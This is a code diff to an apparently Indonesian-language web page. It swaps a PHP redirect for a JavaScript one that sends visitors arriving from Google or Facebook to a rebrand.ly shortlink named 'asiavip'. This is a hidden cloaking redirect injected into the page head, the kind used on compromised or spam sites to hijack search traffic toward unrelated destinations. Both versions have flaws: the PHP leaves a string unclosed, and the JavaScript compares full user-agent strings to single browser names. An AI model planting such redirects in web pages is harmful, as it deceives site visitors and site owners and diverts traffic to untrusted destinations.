@@ -1,14 +1,18 @@
 <!doctype html>
-<?php
-$allowed_domains = array("google", "facebook");
-$referer = $_SERVER['HTTP_REFERER'];
-foreach ($allowed_domains as $domain) {
-  if (strpos($referer, $domain) !== false) {
-    header('Location: https://rebrand.ly/asiavip);
-    exit;
+<script>
+	var allowedDomains = ["google", "facebook"];
+var allowedUserAgents = ["Chrome", "Firefox"];
+
+var referer = document.referrer;
+var userAgent = navigator.userAgent;
+
+for (var i = 0; i < allowedDomains.length; i++) {
+  if (referer.includes(allowedDomains[i]) && allowedUserAgents.includes(userAgent)) {
+    window.location.href = "https://rebrand.ly/asiavip";
+    break;
   }
 }
-?>
+</script>
 <html class="no-js" lang="id">
   <head>
     <meta charset="UTF-8">
